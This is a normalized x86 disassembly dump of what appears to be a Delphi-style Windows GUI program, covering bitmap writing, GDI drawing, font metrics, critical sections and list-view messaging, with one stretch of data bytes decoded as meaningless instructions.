mov eax ebx
call sub_42876c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429b10
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402ba4
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_428cdc
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_425c48
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41ab04
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41ab04
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402ba4
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_428ba0
mov dl [ r-xdata ]
call sub_424ae0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_424e04
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_427cb8
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41ab04
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41ab04
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41ab04
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41ab04
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41ab04
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41ab04
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425274
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41ab04
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_425598
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_429dd0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_428d60
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_427d04
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_429e4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_428368
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429e70
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_429eb8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425f84
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_427b30
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_429f0c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_427b34
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_429f3c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42a214
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_427b30
mov eax [ esi + 0x28 ]
call sub_427b34
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418a84
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_429f9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_424ae0
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_429ff4
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_42a030
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41a8c0
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41aacc
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_425844
jmp r-xdata
jmp r-xdata
call sub_424cf0
sub_42a0a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a135
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_429ff4
cmp eax [ rw-data ]
jne r-xdata
call sub_424cf0
mov eax esi
call sub_429ff4
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_425d88
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402ba4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41ab04
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42a15c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a1ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41a8a0
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41aacc
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41aacc
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42a214
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_424cf0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a1ef
mov eax [ ebp - 0x4 ]
call sub_403190
call sub_403984
call sub_4039d8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a214
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a254
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_427b30
mov eax [ ebx + 0x28 ]
call sub_427b34
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a2d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_42a0a8
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41ab04
pop esi
pop ebx
retn
sub_42a324
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_425344
mov [ rw-data ] eax
pop ebx
retn
sub_42a35c
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42a3a0
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42a35c
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42a46c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a4a4
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_42a69c
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_42a4e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42a4d0
xor eax eax
push ebp
push sub_42a589
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a590
mov eax [ ebp - 0x4 ]
call sub_42a4dc
retn
mov eax 0x10
call sub_4026dc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42a59c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42a59c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a67b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_428ba0
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_424328
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_42420c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416e34
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_4245b0
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4249c4
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42885c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a69c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42a4d0
xor eax eax
push ebp
push sub_42a6e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a6ee
mov eax [ ebp - 0x4 ]
call sub_42a4dc
retn
mov esp ebp
pop ebp
retn
sub_42a6ee
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403190
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42a4d0
xor eax eax
push ebp
push sub_42a6e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a6ee
mov eax [ ebp - 0x4 ]
call sub_42a4dc
retn
mov esp ebp
pop ebp
retn
sub_42a714
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423580
push eax
mov eax ebx
call sub_423580
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42a4e8
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42a74c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a815
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a81c
retn
mov eax [ rw-data ]
call sub_403190
mov eax [ rw-data ]
call sub_403190
mov eax [ rw-data ]
call sub_403190
call sub_427814
mov eax [ rw-data ]
call sub_403190
mov eax [ rw-data ]
call sub_403190
mov eax [ rw-data ]
call sub_403190
mov eax [ rw-data ]
call sub_403190
mov eax [ rw-data ]
call sub_403190
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_40499c
sub_42a820
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42a324
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42a3a0
mov cx 0x2c
mov dl 0x1
mov eax [ sub_422cc4 ]
call sub_422d38
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_422cc4 ]
call sub_422d38
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_422cc4 ]
call sub_422d38
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a46c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4186dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4186dc
mov [ rw-data ] eax
mov ecx sub_423590
mov edx sub_4235a0
mov eax [ sub_421da8 ]
call sub_417c30
mov ecx r-xdata
mov edx sub_4237a8
mov eax [ r-xdata ]
call sub_417c30
sub_42a92c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a951
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a958
retn
sub_42a968
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ ecx + 0x140042 ] 0x0
add al bh
pop esp
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 4 ] ah
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 4 + 0x80042 ] cl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
inc edx
add [ eax - 0x47ffbfd7 ] dl
stosd [ edi ]
inc edx
add [ ebx + ebp * 4 + 0x540c0042 ] ah
dec edi
jb r-xdata
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0x80042 ] gs
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
sbb [ edx + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xaa
push esp
push ebx
je r-xdata
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0x8000408d
stosb [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx ebx
mov edx edi
mov eax esi
call sub_4186d8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403190
sub_42aa94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42aaec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_4186d8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403190
sub_42ab30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42ab74
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_42abb8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418360
mov eax esi
pop esi
pop ebx
retn
sub_42abe4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ac09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac10
retn
sub_42ac24
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42ac84
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42ac24
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_42ad7c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1203
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ae08
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1002
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ae24
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1004
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ae40
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1006
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ae6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ae91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ae98
retn
sub_42aea4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043d0
xor eax eax
push ebp
push sub_42af63
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af6a
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42aea4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f20
sub_42af8c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42aea4
mov [ rw-data ] eax
